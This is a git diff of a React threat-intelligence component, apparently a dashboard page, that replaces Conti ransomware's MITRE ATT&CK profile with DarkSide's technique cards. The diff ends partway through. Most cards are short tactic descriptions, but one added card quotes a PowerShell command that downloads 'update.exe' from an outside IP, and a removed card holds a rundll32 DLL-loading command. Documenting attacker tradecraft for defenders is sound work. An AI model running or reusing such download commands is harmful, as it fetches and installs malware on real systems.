@@ -4,7 +4,7 @@ type Propx = {
   className: string
 }
 
-const Conti: React.FC<Propx> = ({className}) => { 
+const DarkSide: React.FC<Propx> = ({className}) => { 
   return (
 	<>
     <div className={`card mb-6 ${className}`}>
@@ -19,9 +19,10 @@ const Conti: React.FC<Propx> = ({className}) => {
 			    	<th className='min-w-175px border-end border-white'>Persistence</th>
 			    	<th className='min-w-175px border-end border-white'>Privilege-Escalation</th>
 			    	<th className='min-w-175px border-end border-white'>Defense-Evasion</th>
-			    	<th className='min-w-175px border-end border-white'>Credential-Access</th>
 			    	<th className='min-w-175px border-end border-white'>Discovery</th>
 			    	<th className='min-w-175px border-end border-white'>Lateral-Movement</th>
+			    	<th className='min-w-175px border-end border-white'>Collection</th>
+			    	<th className='min-w-175px border-end border-white'>Command-and-Control</th>
 			    	<th className='min-w-175px border-end border-white'>Exfiltration</th>
 			    	<th className='min-w-175px border-end border-white'>Impact</th>
                </tr>
@@ -31,12 +32,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1078</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Valid Accounts</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1566</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Phishing</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Stolen RDP credentials</div>
+									<div>Using phishing to gain initial access</div>
 								</div>
 							</div>
 						</div>
@@ -45,12 +46,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1059.003</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Command and Scripting Interpreter: Windows Command Shell</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1059.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Command and Scripting Interpreter: PowerShell</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Initial execution occurred via the Bazarloader DLL being executed by rundll32</div>
+									<div>Using Powershell to download the "update.exe" file</div>
 								</div>
 							</div>
 						</div>
@@ -59,12 +60,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1133</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>External Remote Services</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1098</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Account Manipulation</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Leverage external-facing remote services</div>
+									<div>Using GPO to maintain persistence</div>
 								</div>
 							</div>
 						</div>
@@ -73,12 +74,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1055.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Process Injection: Dynamic-link Library Injection</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1548.002</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Abuse Elevation Control Mechanism: Bypass User Account Control</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Encrypted dynamic-link library (DLL) Injection</div>
+									<div>Using UAC Bypass, try to elevate the privilege</div>
 								</div>
 							</div>
 						</div>
@@ -87,26 +88,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1027</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Obfuscated Files or Information</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1562.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Impair Defenses: Disable or Modify Tools</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Conti ransomware has encrypted DLLs and used obfuscation to hide Windows API calls.</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1110</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Brute Force</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Legitimate tools</div>
+									<div>Kill and modify the security softwares to avoid detection</div>
 								</div>
 							</div>
 						</div>
@@ -120,7 +107,7 @@ const Conti: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The discovery commands utilize the familiar built in Microsoft utilities</div>
+									<div>Using ADFind to get information about OUs domain trusts</div>
 								</div>
 							</div>
 						</div>
@@ -129,12 +116,12 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1021.002</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Remote Services: SMB/Windows Admin Shares</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1021</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Remote Services</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Copying executable files over SMB and then executing them via remote WMIC calls</div>
+									<div>Using PSExec to move laterally within the network</div>
 								</div>
 							</div>
 						</div>
@@ -143,12 +130,40 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1048</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over Alternative Protocol </span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1113</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Screen Capture</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>WinSCP</div>
+									<div>Using screen capture to collect data</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1090.003</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Proxy: Multi-hop Proxy</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using TOR to C2</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1567.002</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over Web Service: Exfiltration to Cloud Storage</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using Mega or pCloud to stole data</div>
 								</div>
 							</div>
 						</div>
@@ -162,10 +177,9 @@ const Conti: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Windows Restart Manager
-- AES
+									<div>- ChaCha20
 - RSA
-- .conti
+- .victim's ID
 </div>
 								</div>
 							</div>
@@ -176,13 +190,13 @@ const Conti: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1566.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Phishing: Spearphishing Attachment</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1190</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Exploit Public-Facing Application</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Trickbot
-Excel
+									<div>- CVE-2019-5544
+- CVE-2020-3992
 </div>
 								</div>
 							</div>
@@ -222,40 +236,22 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1055.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Process Injection: Dynamic-link Library Injection</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Encrypted dynamic-link library (DLL) Injection</div>
-								</div>
-							</div>
+							
 						</div>
 					</td>          
 				
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1558.003</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Steal or Forge Kerberos Tickets: Kerberoasting</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1069.002</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Permission Groups Discovery: Domain Groups</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Conti actors use Kerberos attacks to attempt to get the Admin hash.</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1069</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Permission Group Discovery</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The discovery commands utilize the familiar built in Microsoft utilities</div>
+									<div>Using ADfind to get information about domain groups</div>
 								</div>
 							</div>
 						</div>
@@ -284,113 +280,24 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1489</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Service Stop</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1048</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over Alternative Protocol</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Stop services related to security, backup, database, and email solutions</div>
+									<div>Using PuTTy to stole data</div>
 								</div>
 							</div>
-						</div>
-					</td>          
-				</tr>
-				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1140</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Deobfuscate/Decode Files or Information</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Using a hardcoded AES-256 key</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1082</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>System Information Discovery</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The discovery commands utilize the familiar built in Microsoft utilities</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
 						</div>
 					</td>          
 				
@@ -402,7 +309,7 @@ Excel
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Delete VSS</div>
+									<div>Delete shadow copies using powershell script</div>
 								</div>
 							</div>
 						</div>
@@ -412,20 +319,14 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1078</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Valid Accounts</span>
 							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Perform the brute force and use valid account to gain initial access</div>
+								</div>
 							</div>
-							
 						</div>
 					</td>          
 				
@@ -477,9 +378,29 @@ Excel
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The discovery commands utilize the familiar built in Microsoft utilities</div>
+									<div>Using ADfind to query AD</div>
 								</div>
 							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
 						</div>
 					</td>          
 				
@@ -567,6 +488,20 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1016</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>System Network Configuration Discovery</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using netscan to gain network information</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
 								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
 								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
@@ -577,14 +512,10 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1124</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>System Time Discovery</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The discovery commands utilize the familiar built in Microsoft utilities</div>
-								</div>
-							</div>
+							
 						</div>
 					</td>          
 				
@@ -672,22 +603,12 @@ Excel
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1518</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Software Discovery</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1614.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>System Location Discovery: System Language Discovery</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Excuted scripts</div>
+									<div>Using program darkside made, darkside get the system language information</div>
 								</div>
 							</div>
 						</div>
@@ -710,91 +631,6 @@ Excel
 								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
 							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				</tr>
-				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1087</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Account Discovery</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Microsoft Active Directory PowerShell module</div>
-								</div>
-							</div>
 						</div>
 					</td>          
 				
@@ -839,12 +675,12 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1078</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Valid Accounts</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1566</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Phishing</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti actors have been observed gaining unauthorized access to victim networks through stolen Remote Desktop Protocol (RDP) credentials.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide actors have previously been observed gaining initial access through phishing.</div>
 					
 					
 					
@@ -855,12 +691,33 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1566.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Phishing: Spearphishing Attachment</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Exploit Public-Facing Application</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware can be delivered using TrickBot malware, which is known to use an email with an Excel sheet containing a malicious macro to deploy the malware.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide ransomware makes use of vulnerabilities CVE-2019-5544 and CVE-2020-3992. Both vulnerabilities have widely available patches, but attackers are targeting to organizations using unpatched or older versions of the software.</div>
+					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
+					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
+						<div>&deg;&nbsp;CVE-2019-5544</div>
+					
+						<div>&deg;&nbsp;CVE-2020-3992</div>
+					</div>
+					
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1078</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Valid Accounts</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide ransomware performs brute force attacks and exploits known vulnerabilities in the remote desktop protocol (RDP) to gain initial access.</div>
 					
 					
 					
@@ -874,23 +731,23 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1059.003</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Command and Scripting Interpreter: Windows Command Shell</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1059.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Command and Scripting Interpreter: PowerShell</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Initial execution occurred via the Bazarloader DLL being executed by rundll32</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The attackers use PowerShell to download the DarkSide binary as “update.exe” using the “DownloadFile” command, abusing Certutil.exe and Bitsadmin.exe in the process.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
 						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;rundll32.exe C:\Users\USERNAME\AppData\Local\Temp\7A86.dll,DLLRegisterServer</div>
+							<div>&deg;&nbsp;powershell -Command "(New-Object Net.WebClient).DownloadFile('http://185.117.119.87/update.exe', 'C:\Windows\update.exe')"</div>
 							
 						</div>
 					</div>
@@ -905,12 +762,12 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1133</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- External Remote Services</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1098</span>
